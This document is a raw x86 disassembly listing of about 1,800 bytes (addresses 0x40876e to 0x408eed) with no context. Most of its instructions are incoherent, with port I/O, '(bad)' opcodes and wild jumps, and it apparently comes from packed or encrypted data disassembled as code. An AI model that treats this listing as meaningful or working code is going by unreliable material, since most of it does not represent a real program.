  40876e:	push   0xd51b1099
  408773:	jb     0x408786
  408775:	ret    
  408776:	das    
  408777:	aaa    
  408778:	cs cld 
  40877a:	mov    ebx,0xdda8569
  40877f:	xchg   ebp,eax
  408780:	in     al,dx
  408781:	dec    ecx
  408782:	adc    cl,bl
  408784:	cli    
  408785:	or     cl,dh
  408787:	mov    bl,0x58
  408789:	pop    esi
  40878a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40878b:	ficom  WORD PTR [ebx+edi*4-0x461a0d8]
  408792:	sbb    eax,0x39
  408795:	add    al,0xfa
  408797:	mov    es,WORD PTR [ecx+0x54]
  40879a:	cs push ebp
  40879c:	rol    BYTE PTR [ecx+eax*1],0x1f
  4087a0:	mov    esp,0x63ad6c1d
  4087a5:	in     al,dx
  4087a6:	push   esp
  4087a7:	xor    eax,DWORD PTR [edi]
  4087a9:	sub    al,0xc1
  4087ab:	jne    0x4087ff
  4087ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ae:	pop    es
  4087af:	mov    edx,0x9aa38c01
  4087b4:	test   BYTE PTR [ecx-0x1f05a18d],0x16
  4087bb:	sbb    BYTE PTR [eax],ah
  4087bd:	sbb    DWORD PTR [ebx],ebx
  4087bf:	inc    eax
  4087c0:	aam    0x13
  4087c2:	pushf  
  4087c3:	sahf   
  4087c4:	adc    BYTE PTR [esi-0x20],bh
  4087c7:	adc    BYTE PTR [eax],dl
  4087c9:	out    0x29,al
  4087cb:	imul   ecx,DWORD PTR [edx-0x69],0x22790e09
  4087d2:	addr16 sbb al,0xe2
  4087d5:	mov    ss,edx
  4087d7:	shl    BYTE PTR [esi+0x10],1
  4087da:	in     eax,0x27
  4087dc:	and    al,0xe2
  4087de:	leave  
  4087df:	fadd   QWORD PTR [edi+0xf]
  4087e2:	or     ebx,edx
  4087e4:	add    DWORD PTR [eax+0x55],edi
  4087e7:	fidiv  WORD PTR ds:0x446db477
  4087ed:	pop    DWORD PTR [edi+0x55]
  4087f0:	and    eax,0x7722455
  4087f5:	sub    ah,BYTE PTR [edi]
  4087f7:	jbe    0x4087ec
  4087f9:	sub    al,bh
  4087fb:	rol    BYTE PTR [edx],1
  4087fd:	dec    esi
  4087fe:	cwde   
  4087ff:	jmp    0x5fb1c17c
  408804:	mov    ecx,0xefb7fd2d
  408809:	push   ebx
  40880a:	push   edx
  40880b:	adc    al,0x4b
  40880d:	in     eax,dx
  40880e:	fild   WORD PTR ds:0x50131659
  408814:	pop    esi
  408815:	push   edx
  408816:	sub    BYTE PTR [eax],0xce
  408819:	nop
  40881a:	aas    
  40881b:	ins    BYTE PTR es:[edi],dx
  40881c:	in     al,0xad
  40881e:	inc    BYTE PTR [ecx]
  408820:	sbb    BYTE PTR [edi],0x36
  408823:	pop    ecx
  408824:	out    dx,eax
  408825:	adc    esi,DWORD PTR [esi+eax*8-0x52]
  408829:	fwait
  40882a:	bound  ebx,QWORD PTR [esi+0x7f]
  40882d:	xchg   edi,eax
  40882e:	and    BYTE PTR ds:0x90bdd12a,dh
  408834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408835:	js     0x408893
  408837:	in     eax,0x7a
  408839:	hlt    
  40883a:	xchg   esp,eax
  40883b:	mov    ds,WORD PTR [esi+0x34]
  40883e:	nop
  40883f:	dec    edx
  408840:	(bad)  [edx-0x55e5924c]
  408846:	mov    edi,0xbebb1aaa
  40884b:	xchg   ebp,eax
  40884c:	mov    eax,DWORD PTR [ebp-0x18]
  40884f:	add    eax,0xaa
  408854:	push   eax
  408855:	jmp    0x408d60
  40885a:	ror    esp,cl
  40885c:	ror    eax,cl
  40885e:	ror    edi,cl
  408860:	rcl    ebx,cl
  408862:	retf   
  408863:	rol    ecx,1
  408865:	into   
  408866:	stc    
  408867:	rcl    BYTE PTR [ecx-0x41],cl
  40886a:	fsubp  st(7),st
  40886c:	js     0x4088e6
  40886e:	push   0x7c
  408870:	js     0x4088ea
  408872:	loopne 0x4088e1
  408874:	outs   dx,DWORD PTR ds:[esi]
  408875:	nop
  408876:	jecxz  0x408892
  408878:	int    0xd6
  40887a:	int3   
  40887b:	out    dx,eax
  40887c:	xchg   esi,eax
  40887d:	push   ebp
  40887e:	ins    BYTE PTR es:[edi],dx
  40887f:	xor    DWORD PTR [edi+0x62],ebp
  408882:	jbe    0x4088e8
  408884:	cmovle ebp,DWORD PTR [edi-0x64]
  408888:	test   BYTE PTR [esi+0xc3a295e],bh
  40888e:	inc    eax
  40888f:	js     0x40884d
  408891:	int3   
  408892:	data16 data16 cmp bl,BYTE PTR [edi]
  408896:	mov    ch,0x8c
  408899:	out    dx,eax
  40889a:	stc    
  40889b:	mov    edi,0x84e0e21b
  4088a0:	ins    BYTE PTR es:[edi],dx
  4088a1:	push   esp
  4088a2:	ja     0x408879
  4088a4:	stos   DWORD PTR es:[edi],eax
  4088a5:	dec    ecx
  4088a6:	lock and DWORD PTR [ebx+0x23eb15de],edi
  4088ad:	cmc    
  4088ae:	idiv   dl
  4088b0:	mov    ds:0x312f4c92,eax
  4088b5:	ds push es
  4088b7:	iret   
  4088b8:	dec    edi
  4088b9:	fcomi  st,st(6)
  4088bb:	xlat   BYTE PTR ds:[ebx]
  4088bc:	cli    
  4088bd:	and    BYTE PTR [ecx],al
  4088bf:	mov    ds:0x8c59777b,al
  4088c4:	add    eax,0xaea322cf
  4088c9:	fst    QWORD PTR [ecx+0x9]
  4088cc:	cmc    
  4088cd:	mov    eax,0x56b50c5e
  4088d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088d3:	xchg   esi,eax
  4088d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088d5:	(bad)  
  4088d6:	popf   
  4088d7:	icebp  
  4088d8:	push   ebx
  4088d9:	(bad)  
  4088da:	ins    BYTE PTR es:[edi],dx
  4088db:	inc    ecx
  4088dc:	xor    DWORD PTR [edx-0xf4e2bca],ebp
  4088e2:	xchg   ebx,eax
  4088e3:	call   0x34a35c92
  4088e8:	pusha  
  4088e9:	jo     0x408881
  4088eb:	popa   
  4088ec:	repz inc edx
  4088ee:	lahf   
  4088ef:	std    
  4088f0:	pushf  
  4088f1:	push   0xfffffff4
  4088f3:	pop    esp
  4088f4:	test   al,0x7d
  4088f6:	mov    ebx,0x2301ce5d
  4088fb:	jo     0x408944
  4088fd:	call   0x5c3b:0x6be172a8
  408904:	pushf  
  408905:	mov    ss,WORD PTR [edx-0x9d50930]
  40890b:	xor    cl,BYTE PTR [edx+0x753b464]
  408911:	dec    ecx
  408912:	jecxz  0x408902
  408914:	es inc edi
  408916:	in     eax,dx
  408917:	lods   eax,DWORD PTR ds:[esi]
  408918:	icebp  
  408919:	nop
  40891a:	adc    DWORD PTR [eax],0xffffffd7
  40891d:	jp     0x408905
  40891f:	mov    ebp,0x23a589cd
  408924:	out    0x5e,eax
  408926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408927:	lds    ecx,FWORD PTR [esi+0x5b]
  40892a:	fdivr  QWORD PTR [ecx+0x38]
  40892d:	adc    al,0xef
  40892f:	test   DWORD PTR [ebp-0x844ca81],edi
  408935:	mov    WORD PTR [esi],?
  408937:	js     0x40895b
  408939:	sar    BYTE PTR [edi],1
  40893b:	rol    DWORD PTR [eax-0x5b83960b],0xda
  408942:	(bad)  
  408943:	lods   al,BYTE PTR ds:[esi]
  408944:	fwait
  408945:	jno    0x4089a9
  408947:	mov    esi,DWORD PTR [edi+0x14d50859]
  40894d:	cmc    
  40894e:	repnz push ds
  408950:	mov    eax,ds:0xd01c7f00
  408955:	test   BYTE PTR [edx+0x3f580152],bh
  40895b:	stc    
  40895c:	jnp    0x408951
  40895e:	xchg   BYTE PTR [eax-0x66],ah
  408961:	imul   edi,DWORD PTR [ebx-0x2c],0x55
  408965:	stc    
  408966:	and    dl,ah
  408968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408969:	test   eax,0xe4ac659d
  40896e:	mov    al,0x5e
  408970:	stos   DWORD PTR es:[edi],eax
  408971:	and    dh,BYTE PTR [edi+ecx*4]
  408974:	idiv   DWORD PTR [esi]
  408976:	inc    esi
  408977:	ror    BYTE PTR [edi+edi*1+0x4e],cl
  40897b:	and    bl,BYTE PTR [edi]
  40897d:	sbb    ah,BYTE PTR [ebp+0x65]
  408980:	cs lock sbb eax,0x43d8dba3
  408987:	cmp    esp,DWORD PTR [ecx+0x12]
  40898a:	inc    edi
  40898b:	jl     0x408922
  40898d:	pop    ebx
  40898e:	loope  0x4089e6
  408990:	sub    dl,bl
  408992:	ret    
  408993:	(bad)  
  408994:	sub    al,0x23
  408996:	dec    esi
  408997:	mov    dl,BYTE PTR [ebp+0x793beb72]
  40899d:	sub    ebp,DWORD PTR [ebp+esi*2-0x6f6a1655]
  4089a4:	jge    0x40898b
  4089a6:	cmp    bh,BYTE PTR [edi-0x39a16c06]
  4089ac:	(bad)  
  4089ad:	mov    ?,WORD PTR [edi+0x3de2144]
  4089b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b4:	add    edi,DWORD PTR [ebx]
  4089b6:	sbb    BYTE PTR [eax-0x59],dh
  4089b9:	int3   
  4089ba:	adc    edx,ebx
  4089bc:	popa   
  4089bd:	push   eax
  4089be:	cmp    al,0x67
  4089c0:	jns    0x408982
  4089c2:	fisubr WORD PTR [ebx]
  4089c4:	shr    dh,0x21
  4089c7:	stc    
  4089c8:	test   esi,0xe11a42aa
  4089ce:	xlat   BYTE PTR ds:[ebx]
  4089cf:	lds    ebx,FWORD PTR ds:0x42bd208c
  4089d5:	dec    esi
  4089d6:	je     0x4089e3
  4089d8:	and    al,0x60
  4089da:	addr16 loop 0x4089ac
  4089dd:	jg     0x4089a3
  4089df:	fisttp QWORD PTR [ebx-0x53]
  4089e2:	daa    
  4089e3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4089e5:	mov    ?,WORD PTR [edi+0x23c9ff52]
  4089eb:	mov    al,0x78
  4089ed:	jo     0x4089a9
  4089ef:	repnz adc eax,0xc184b5dd
  4089f5:	adc    dl,al
  4089f7:	pop    ebp
  4089f8:	push   es
  4089f9:	out    dx,al
  4089fa:	cs jno 0x4089e8
  4089fd:	jecxz  0x408a67
  4089ff:	dec    ecx
  408a00:	sub    eax,0xdb133f84
  408a05:	jmp    DWORD PTR [esi-0x48de4185]
  408a0b:	fs jmp 0x408a1d
  408a0e:	push   ss
  408a0f:	dec    esi
  408a10:	into   
  408a11:	xchg   edi,eax
  408a12:	xor    al,0x82
  408a14:	mov    eax,ds:0x8ad8720
  408a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a1a:	js     0x4089e3
  408a1c:	ret    0xaf5f
  408a1f:	sti    
  408a20:	stos   DWORD PTR es:[edi],eax
  408a21:	mov    ch,BYTE PTR [edi+0x6f9305ac]
  408a27:	arpl   WORD PTR [edi+0x5977222f],bp
  408a2d:	jmp    0xe20f:0xd178c40
  408a34:	shr    DWORD PTR [edi+0x2f7c79bc],1
  408a3a:	xor    eax,0xf3f58def
  408a3f:	leave  
  408a40:	scas   al,BYTE PTR es:[edi]
  408a41:	xor    al,0xbd
  408a43:	jg     0x408a16
  408a45:	(bad)  
  408a46:	fisub  DWORD PTR [edx]
  408a48:	pop    ebx
  408a49:	lds    edx,FWORD PTR [ebx+esi*8-0x27425583]
  408a50:	dec    edi
  408a51:	jae    0x408a8a
  408a53:	into   
  408a54:	out    0x70,al
  408a56:	lods   al,BYTE PTR ds:[esi]
  408a57:	stc    
  408a58:	mov    ds:0x11e3b4a5,al
  408a5d:	rcr    DWORD PTR [edi+0x2a28efa2],1
  408a63:	nop
  408a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a65:	xchg   BYTE PTR [ebp+0x5a],cl
  408a68:	pop    esp
  408a69:	cmp    eax,0x908bc25c
  408a6e:	cmp    ecx,esp
  408a70:	xor    esp,edx
  408a72:	nop
  408a73:	out    0x1b,al
  408a75:	dec    ecx
  408a76:	lods   eax,DWORD PTR ds:[esi]
  408a77:	jmp    0x408a93
  408a79:	pop    esi
  408a7a:	test   BYTE PTR [edx],ch
  408a7c:	aam    0xa3
  408a7e:	inc    edi
  408a7f:	and    bh,dh
  408a81:	dec    esi
  408a82:	sti    
  408a83:	rcl    dh,0x11
  408a86:	xor    BYTE PTR ds:0xd4b03502,dh
  408a8c:	ret    
  408a8d:	cmc    
  408a8e:	outs   dx,DWORD PTR ds:[esi]
  408a8f:	ror    eax,1
  408a91:	sbb    dh,0xb0
  408a94:	adc    DWORD PTR [ebp+0x3a],esi
  408a97:	mov    ebp,0x6e82df91
  408a9c:	fadd   st,st(4)
  408a9e:	popa   
  408a9f:	pushf  
  408aa0:	retf   
  408aa1:	jnp    0x408a74
  408aa3:	daa    
  408aa4:	xsaves [edx-0x7f]
  408aa8:	adc    edi,DWORD PTR [ebx+0x291e8dbc]
  408aae:	or     al,0x53
  408ab0:	pusha  
  408ab1:	sbb    eax,0xd18704e5
  408ab6:	add    eax,0xbd5a6aa6
  408abb:	sub    BYTE PTR [esi],al
  408abd:	xchg   esp,eax
  408abe:	mov    esi,0x484adcce
  408ac3:	pop    es
  408ac4:	sbb    BYTE PTR [ebx-0x5da46e30],bl
  408aca:	daa    
  408acb:	xchg   esp,eax
  408acc:	push   ds
  408acd:	cmp    DWORD PTR [ecx-0x5d],esi
  408ad0:	out    dx,al
  408ad1:	jno    0x408a93
  408ad3:	xchg   ebx,eax
  408ad4:	sti    
  408ad5:	in     eax,0x20
  408ad7:	pop    edx
  408ad8:	or     eax,ebx
  408ada:	dec    ebp
  408adb:	repz test al,0xd2
  408ade:	shr    bh,0x2d
  408ae1:	pop    ebx
  408ae2:	cli    
  408ae3:	imul   ebp,DWORD PTR [esi],0x535c7065
  408ae9:	jl     0x408ab6
  408aeb:	pop    ds
  408aec:	push   ecx
  408aed:	cmp    al,0xe0
  408aef:	cmp    dl,BYTE PTR [eax]
  408af1:	xchg   ebx,eax
  408af2:	(bad)  
  408af3:	retf   
  408af4:	pop    esi
  408af5:	dec    eax
  408af6:	iret   
  408af7:	loopne 0x408a8b
  408af9:	outs   dx,BYTE PTR ds:[esi]
  408afa:	inc    ebx
  408afb:	inc    ebp
  408afc:	mov    bh,0xe3
  408afe:	imul   ecx,DWORD PTR [edi+0x11d70a70],0x3d9531a7
  408b08:	bound  ebp,QWORD PTR [ebx+0x350380aa]
  408b0e:	popa   
  408b0f:	mov    esi,0x717c8fdd
  408b14:	lds    edi,FWORD PTR [ebx+0x31]
  408b17:	mov    bl,0x9a
  408b19:	scas   eax,DWORD PTR es:[edi]
  408b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b1b:	enter  0x7966,0x49
  408b1f:	scas   eax,DWORD PTR es:[edi]
  408b20:	pop    es
  408b21:	iret   
  408b22:	xchg   ebp,eax
  408b23:	in     eax,dx
  408b24:	pop    edi
  408b25:	sahf   
  408b26:	cmp    DWORD PTR [edi+0x13],eax
  408b29:	mov    bh,0x3
  408b2b:	xchg   ebx,eax
  408b2c:	inc    ebx
  408b2d:	jb     0x408b0c
  408b2f:	test   BYTE PTR [ebp-0x4a4004f5],0xdf
  408b36:	dec    edi
  408b37:	fistp  QWORD PTR fs:[ecx+0x16a06d66]
  408b3e:	mov    cl,0xf7
  408b40:	xchg   esp,eax
  408b41:	mov    ds:0xeb4530f5,al
  408b46:	mov    ch,0xfb
  408b48:	dec    eax
  408b49:	push   ecx
  408b4a:	push   ecx
  408b4b:	push   es
  408b4c:	pop    esi
  408b4d:	loope  0x408bc7
  408b4f:	pop    ecx
  408b50:	aad    0xc3
  408b52:	add    al,0x7a
  408b54:	ret    
  408b55:	xor    BYTE PTR [ebx-0x1a2345e0],bl
  408b5b:	push   es
  408b5c:	sub    dl,BYTE PTR [ecx+0x37]
  408b5f:	xchg   ecx,eax
  408b61:	test   al,0x8e
  408b63:	pop    ss
  408b64:	bound  ecx,QWORD PTR [ecx-0x56009d80]
  408b6a:	fcom   QWORD PTR [ebp-0x48]
  408b6d:	ins    DWORD PTR es:[edi],dx
  408b6e:	xor    BYTE PTR [ebx+0x34],0x58
  408b72:	test   BYTE PTR [edi-0x45],ch
  408b75:	stc    
  408b76:	xchg   esi,eax
  408b77:	pop    es
  408b78:	sub    cl,BYTE PTR [edi+0x2d]
  408b7b:	data16 mov fs,WORD PTR [edx-0x5e075ad8]
  408b82:	cmc    
  408b83:	inc    edi
  408b84:	(bad)  
  408b85:	call   0x9492ee6b
  408b8a:	fcom   QWORD PTR [ebx-0x1b1d76d5]
  408b90:	or     BYTE PTR [ecx+0x469415cb],bh
  408b96:	bound  edi,QWORD PTR [eax-0x73]
  408b99:	mov    edi,0x65c7975f
  408b9e:	and    edx,DWORD PTR [ebx]
  408ba0:	mov    bl,0xc4
  408ba2:	sub    ch,al
  408ba4:	mov    edx,esi
  408ba6:	pop    ds
  408ba7:	mov    edi,0x3937c31e
  408bac:	xchg   ecx,eax
  408bad:	adc    cl,BYTE PTR [edi-0x5e35081c]
  408bb3:	jae    0x408be0
  408bb5:	bound  ebp,QWORD PTR [ebp+0x59]
  408bb8:	aam    0x34
  408bba:	in     eax,0x23
  408bbc:	lea    esp,[ebp+0x61]
  408bbf:	shr    BYTE PTR [ebx+0x39],0xf8
  408bc3:	push   edx
  408bc4:	ret    
  408bc5:	test   DWORD PTR [edx+0x7c],0x21b33bd4
  408bcc:	jg     0x408c24
  408bce:	or     eax,0x77cd3029
  408bd3:	mov    dl,BYTE PTR [edi+0x29ad003d]
  408bd9:	push   esi
  408bda:	outs   dx,BYTE PTR ds:[esi]
  408bdb:	pusha  
  408bdc:	pushf  
  408bdd:	xor    DWORD PTR [esi+0x5ed34eb6],ecx
  408be3:	inc    esi
  408be4:	xchg   bl,bh
  408be6:	inc    edx
  408be7:	jg     0x408c26
  408be9:	dec    DWORD PTR [edi+ecx*8]
  408bec:	cmp    BYTE PTR [ebx],al
  408bee:	push   ebx
  408bef:	cmc    
  408bf0:	mov    al,0x8f
  408bf2:	mov    ecx,0x4a76a94a
  408bf7:	pop    esp
  408bf8:	shl    DWORD PTR ss:[edx],0x11
  408bfc:	mov    ebx,0x6b78aab4
  408c01:	addr16 mov al,0x1d
  408c04:	xchg   edi,eax
  408c05:	outs   dx,DWORD PTR ds:[esi]
  408c06:	(bad)  
  408c07:	mov    edx,DWORD PTR [esp-0x50]
  408c0b:	enter  0x7e9a,0x56
  408c0f:	cmp    al,0x63
  408c11:	rcl    BYTE PTR [ebp-0x29],0x20
  408c15:	(bad)  
  408c16:	bound  esi,QWORD PTR [edi]
  408c18:	jno    0x408c13
  408c1a:	gs je  0x408c81
  408c1d:	mov    WORD PTR [ecx-0x4],ds
  408c20:	xchg   edi,esi
  408c22:	test   BYTE PTR [edi+0x6ebd018b],ah
  408c28:	retf   
  408c29:	mov    ds:0x8b56ef68,eax
  408c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c2f:	jmp    0x522044b7
  408c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c35:	fistp  QWORD PTR [edi+0x5d4cc07d]
  408c3b:	bound  esp,QWORD PTR [ebx-0x41388b2e]
  408c41:	iret   
  408c42:	sbb    BYTE PTR [edi+0x7d3bcece],0x95
  408c49:	mov    eax,0x18c91606
  408c4e:	jmp    0x9e2d8555
  408c53:	adc    edx,edi
  408c55:	or     ecx,DWORD PTR [edx+edx*1+0x7c]
  408c59:	dec    esi
  408c5a:	push   es
  408c5b:	ds ret 0x3d46
  408c5f:	dec    edx
  408c60:	pop    ds
  408c61:	ja     0x408c8c
  408c63:	cmp    BYTE PTR [ebx],al
  408c65:	add    al,0x97
  408c67:	push   0x1b
  408c69:	cld    
  408c6a:	xchg   ebp,eax
  408c6b:	xlat   BYTE PTR ds:[ebx]
  408c6c:	push   esp
  408c6d:	in     al,dx
  408c6e:	imul   BYTE PTR gs:[ecx]
  408c71:	inc    BYTE PTR [edx+ebx*8-0x1426629f]
  408c78:	push   ebx
  408c79:	sub    dh,BYTE PTR [edi]
  408c7b:	or     al,0xfa
  408c7d:	test   al,0x70
  408c7f:	jmp    0x984f894d
  408c84:	into   
  408c85:	std    
  408c86:	inc    edi
  408c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c88:	push   edi
  408c89:	or     al,0x2
  408c8b:	jno    0x408c98
  408c8d:	rol    BYTE PTR [esi-0x22],1
  408c90:	push   es
  408c91:	or     eax,0x57b82797
  408c96:	cwde   
  408c97:	mov    eax,0xeb29f554
  408c9c:	or     bh,dl
  408c9e:	aaa    
  408c9f:	mov    ds:0x6cab2156,al
  408ca4:	outs   dx,BYTE PTR ds:[esi]
  408ca5:	add    cl,BYTE PTR [ebx-0x39]
  408ca8:	sub    ebx,eax
  408caa:	xor    BYTE PTR [esi+0x6c6d621f],dh
  408cb0:	cld    
  408cb1:	inc    edi
  408cb2:	adc    DWORD PTR [ebx],edx
  408cb4:	inc    edx
  408cb5:	retf   0x5db7
  408cb8:	or     al,0xb3
  408cba:	cli    
  408cbb:	xor    bl,BYTE PTR [ebp-0x13]
  408cbe:	sbb    dh,BYTE PTR [esi]
  408cc0:	dec    eax
  408cc1:	or     eax,0x668f1ae9
  408cc6:	mov    edi,DWORD PTR [ebx+0x7]
  408cc9:	xchg   edx,eax
  408cca:	inc    edi
  408ccb:	ins    DWORD PTR es:[edi],dx
  408ccc:	popf   
  408ccd:	mov    ds,WORD PTR [edx+0x48]
  408cd0:	sub    BYTE PTR [edi-0x43],cl
  408cd3:	pop    esi
  408cd4:	inc    ebx
  408cd5:	xor    DWORD PTR [edx+0x5671f450],esp
  408cdb:	jecxz  0x408d05
  408cdd:	mov    BYTE PTR [esp+edx*2+0x51],bh
  408ce1:	ret    0x89f6
  408ce4:	bound  esp,QWORD PTR [esi+0x24e82d96]
  408cea:	mov    edx,0xf6ad4974
  408cef:	xchg   ecx,eax
  408cf0:	(bad)  
  408cf1:	jmp    0x408d30
  408cf3:	dec    ebp
  408cf4:	sbb    DWORD PTR [edi-0x8521bbf],ecx
  408cfa:	cmp    DWORD PTR [ebp+0x41dd602b],edi
  408d00:	fs and al,0x3b
  408d03:	push   esp
  408d04:	pop    ebx
  408d05:	jle    0x408d70
  408d07:	or     BYTE PTR [esi-0x7b],al
  408d0a:	sar    BYTE PTR [eax+0x69],cl
  408d0d:	(bad)  
  408d0e:	dec    eax
  408d0f:	xor    ebp,ebp
  408d11:	cmp    esp,DWORD PTR [edx]
  408d13:	imul   ebx,ecx,0x71
  408d16:	push   edx
  408d17:	loop   0x408d16
  408d19:	pop    esp
  408d1a:	mov    cl,0xa1
  408d1c:	retf   
  408d1d:	fisub  DWORD PTR [edx]
  408d1f:	push   eax
  408d20:	cmp    bh,BYTE PTR [esi-0x533244e5]
  408d26:	dec    edi
  408d27:	xchg   esp,eax
  408d28:	out    0x43,eax
  408d2a:	repnz pop ebp
  408d2c:	outs   dx,BYTE PTR ds:[esi]
  408d2d:	xor    ebp,0xffffffc1
  408d30:	aas    
  408d31:	inc    eax
  408d32:	dec    ebx
  408d33:	retf   
  408d34:	iret   
  408d35:	jmp    0xf8e6:0xcc9a6762
  408d3c:	loopne 0x408ce9
  408d3e:	ins    DWORD PTR es:[edi],dx
  408d3f:	jl     0x408d13
  408d41:	fwait
  408d42:	mov    ebx,0x1dabb97d
  408d47:	adc    esp,DWORD PTR [esi]
  408d49:	loop   0x408d68
  408d4b:	sub    eax,0x38d1ade9
  408d50:	ja     0x408d53
  408d52:	mov    ebx,0x776cb3ca
  408d57:	mov    al,ch
  408d59:	mov    edi,esi
  408d5b:	inc    DWORD PTR [edi-0x74fb886d]
  408d61:	inc    ebp
  408d62:	call   0x1d90df2
  408d67:	add    BYTE PTR [eax],al
  408d69:	push   DWORD PTR [eax]
  408d6b:	jmp    0x409276
  408d70:	ret    0x3ccb
  408d73:	ret    
  408d74:	leave  
  408d75:	retf   
  408d76:	ror    ecx,0x4f
  408d79:	(bad)  
  408d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d7b:	(bad)  
  408d7c:	ss pop ss
  408d7e:	adc    BYTE PTR [ecx-0x38],bl
  408d81:	bnd js 0x408dfc
  408d84:	push   0x7c
  408d86:	js     0x408e00
  408d88:	call   0xa27b:0xde9a4b1a
  408d8f:	mov    dh,0x5d
  408d91:	into   
  408d92:	cmp    dh,dh
  408d94:	not    BYTE PTR [ebp+0x7d]
  408d97:	cdq    
  408d98:	adc    edi,ebp
  408d9a:	inc    esi
  408d9b:	inc    ebx
  408d9c:	sar    DWORD PTR [ebx+ebx*1-0x4f],0x21
  408da1:	xor    ecx,0x24393f01
  408da7:	push   ax
  408da9:	ret    0xf2fd
  408dac:	loope  0x408df3
  408dae:	add    esp,DWORD PTR [ecx+0x6d]
  408db1:	cli    
  408db2:	cmpps  xmm2,XMMWORD PTR [ebp+0x8],0xf6
  408db7:	mov    WORD PTR [edx+0x5a],ds
  408dba:	pop    ecx
  408dbb:	ret    
  408dbc:	sub    ah,bh
  408dbe:	jge    0x408d91
  408dc0:	ret    
  408dc1:	sub    eax,0x41ccd277
  408dc6:	pop    ebx
  408dc7:	mov    ebx,esi
  408dc9:	pop    ebx
  408dca:	mov    esp,0x98dd446e
  408dcf:	mov    al,0xaa
  408dd1:	inc    edi
  408dd2:	cdq    
  408dd3:	repz loopne 0x408e11
  408dd6:	retf   0x2882
  408dd9:	call   0x79b4:0xd70051ca
  408de0:	push   eax
  408de1:	loopne 0x408d91
  408de3:	and    BYTE PTR [esi],dl
  408de5:	ja     0x408e65
  408de7:	fadd   DWORD PTR [edx-0x45]
  408dea:	hlt    
  408deb:	inc    edx
  408dec:	stc    
  408ded:	pop    ds
  408dee:	jecxz  0x408e15
  408df0:	jl     0x408e60
  408df2:	xchg   edi,eax
  408df3:	fs push ecx
  408df5:	lahf   
  408df6:	adc    BYTE PTR [edx],dh
  408df8:	and    ch,BYTE PTR [esi-0x38ce7751]
  408dfe:	stos   DWORD PTR es:[edi],eax
  408dff:	(bad)  
  408e00:	or     bl,dl
  408e02:	aas    
  408e03:	in     eax,0x35
  408e05:	lea    edi,[esi]
  408e07:	jp     0x408e6e
  408e09:	jne    0x408dee
  408e0b:	cli    
  408e0c:	mov    DWORD PTR [eax],0xcd70451
  408e12:	rcr    DWORD PTR [esi],1
  408e14:	shl    DWORD PTR [edx],0x54
  408e17:	dec    edx
  408e18:	cmp    DWORD PTR [ecx-0x43d8ef13],ecx
  408e1e:	rcr    DWORD PTR [eax],1
  408e20:	mov    edi,DWORD PTR [ecx-0x24]
  408e23:	or     dl,0x7
  408e26:	lahf   
  408e27:	mov    ebp,0xb8ed1c59
  408e2c:	out    dx,al
  408e2d:	jb     0x408e2b
  408e2f:	and    eax,edi
  408e31:	cmp    bh,BYTE PTR gs:[ebx+0xbf81d6b]
  408e38:	cmp    DWORD PTR [edx-0x3b],esi
  408e3b:	xchg   edx,eax
  408e3c:	ja     0x408dd6
  408e3e:	adc    DWORD PTR [ebp+0x675e1f29],eax
  408e44:	pop    ds
  408e45:	btr    ebx,ebx
  408e48:	mov    BYTE PTR [ecx+0x27d288a9],dh
  408e4e:	ins    BYTE PTR es:[edi],dx
  408e4f:	rol    DWORD PTR [ebx-0x5d],1
  408e52:	lods   eax,DWORD PTR ds:[esi]
  408e53:	mov    WORD PTR [ecx],fs
  408e55:	gs adc eax,0x8118ecfd
  408e5b:	dec    ecx
  408e5c:	js     0x408de0
  408e5e:	ss fld st(0)
  408e61:	sub    edx,esp
  408e63:	add    bl,0x13
  408e66:	dec    eax
  408e67:	or     BYTE PTR [edx+0x7ac4819d],dl
  408e6d:	in     eax,0x2a
  408e6f:	xchg   esp,eax
  408e70:	adc    DWORD PTR [ecx+0x50fec87e],esi
  408e76:	mov    dh,0x9
  408e78:	fsub   DWORD PTR [ebx+0x7bd402a9]
  408e7e:	scas   al,BYTE PTR es:[edi]
  408e7f:	js     0x408ed5
  408e81:	mov    ds:0x5db85d19,eax
  408e86:	cmp    ecx,DWORD PTR [eax]
  408e88:	retf   0xe4aa
  408e8b:	mov    eax,cs
  408e8d:	lea    esp,[ebx-0x37]
  408e90:	or     dh,BYTE PTR [edx]
  408e92:	jecxz  0x408e42
  408e94:	xor    dl,BYTE PTR [ebp+0x65]
  408e97:	repz fdivrp st(5),st
  408e9a:	enter  0xb53c,0x2
  408e9e:	ds push 0xffe4340d
  408ea4:	push   ss
  408ea5:	repz adc bh,BYTE PTR [esi+0x0]
  408ea9:	popa   
  408eaa:	cmp    edx,esp
  408eac:	aaa    
  408ead:	mov    esi,0x6a45e22c
  408eb2:	repz (bad) 
  408eb4:	push   0xffffffc5
  408eb6:	outs   dx,DWORD PTR ds:[esi]
  408eb7:	mov    ebp,es
  408eb9:	xor    bh,al
  408ebb:	mov    ecx,0x76c84840
  408ec0:	in     al,0x7d
  408ec2:	test   al,0x6e
  408ec4:	cmp    edx,esi
  408ec6:	inc    ebx
  408ec7:	aad    0x7a
  408ec9:	xchg   esp,eax
  408eca:	or     DWORD PTR [ebp+0x1a],esp
  408ecd:	jl     0x408ebd
  408ecf:	gs js  0x408f34
  408ed2:	mov    ds:0xb85ed9b6,eax
  408ed7:	cld    
  408ed8:	sub    ebx,edx
  408eda:	xor    cl,dl
  408edc:	sbb    BYTE PTR [esi],cl
  408ede:	and    eax,0x4095abc9
  408ee3:	je     0x408e6a
  408ee5:	pop    edx
  408ee6:	push   0x59
  408ee8:	data16 (bad) 
  408eea:	sbb    BYTE PTR [ecx+0x55],dh
  408eed:	sar    BYTE PTR ds:0xb086e9c9,cl
